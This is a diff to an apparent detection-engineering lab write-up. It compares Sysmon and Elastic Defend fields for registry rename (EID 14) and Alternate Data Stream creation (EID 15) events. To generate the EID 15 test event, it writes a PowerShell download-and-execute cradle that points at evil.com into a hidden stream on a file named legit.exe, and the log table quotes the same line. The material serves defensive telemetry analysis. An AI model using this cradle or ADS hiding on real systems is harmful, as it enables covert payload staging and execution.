@@ -551,10 +551,46 @@ Had to use regedit.exe to manual edit name to trigger the event
 | `-` | `user.id` | `-` | Sysmon: `S-1-5-18` (SYSTEM context) |
 | `-` | `winlog.record_id` | `-` | Sysmon only |
 
+### Analysis
+EID 14 is a complete EDR gap no rename events appear in `endpoint.events.registry` for default EDR settings. Also note that NtRenameKey seem to only reliably triggered via regedit.exe and not in PowerShell's Rename-Item.
 
 
+## EID 15 FileCreateStreamHash 
+EID 15 fires when a file is created with a named Alternate Data Stream (ADS). Sysmon hooks the minifilter and captures the stream name and a hash of the stream content to identify the mark-of-the-web.
 
+### Event Generation
+```
+$payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
+Set-Content -Path "C:\Temp\legit.exe:payload.ps1" -Value $payload
+```
 
+### Field Comparision
+| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
+|---|---|---|---|
+| `RuleName` | `rule.name` | `-` | EDR has no rule tagging on raw events |
+| `UtcTime` | `@timestamp` | `@timestamp` | |
+| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different formats Sysmon `{GUID}`, EDR opaque string |
+| `ProcessId` | `process.pid` | `process.pid` | |
+| `Image` | `process.executable` | `process.executable` | |
+| `TargetFilename` | `file.path` | `file.path` | |
+| `-` | `file.name` | `file.name` | |
+| `-` | `file.extension` | `file.extension` | Sysmon: `ps1` (stream extension). EDR: `exe` (host file extension) different parsing behavior |
+| `-` | `file.directory` | `-` | Sysmon only |
+| `CreationUtcTime` | `winlog.event_data.CreationUtcTime` | `-` | Sysmon only host file original creation time, not stream creation time |
+| `Hash` | `file.hash.sha1` + `file.hash.md5` + `file.hash.sha256` | `-` | Sysmon only multi-algo hash of the stream content |
+| `Contents` | `winlog.event_data.Contents` | `-` | Sysmon only raw stream content captured in the event. `IEX (New-Object Net.WebClient).DownloadString(...)` visible directly in the log |
+| `-` | `-` | `file.size` | EDR only size of stream content |
+| `-` | `-` | `file.Ext.entropy` | EDR only entropy of stream content. Useful for detecting encoded/encrypted payloads in ADS |
+| `-` | `-` | `file.Ext.header_bytes` | EDR only first bytes of stream in hex. Decodes to `IEX (New-Object ` confirms payload type without needing `Contents` |
+| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Both present. Sysmon `user.id`: `S-1-5-18`. EDR `user.id`: actual user SID |
+| `-` | `-` | `process.parent.pid` | EDR only |
+| `-` | `-` | `process.thread.id` | EDR only |
+| `-` | `-` | `process.code_signature.*` | EDR only signing status of writing process |
+| `-` | `-` | `process.Ext.code_signature.*` | EDR only extended signature with thumbprint |
+| `-` | `winlog.record_id` | `-` | Sysmon only |
+
+### Analysis
+Both detect the ADS creation but Sysmon's advantage is `winlog.event_data.Contents`, which captures the raw stream content. Also the Zone.Identifier which was absent in this lab and would need to correlate EDR `endpoint.events.network` to find what url for example powershell.exe attempted connection to.
 
 
 
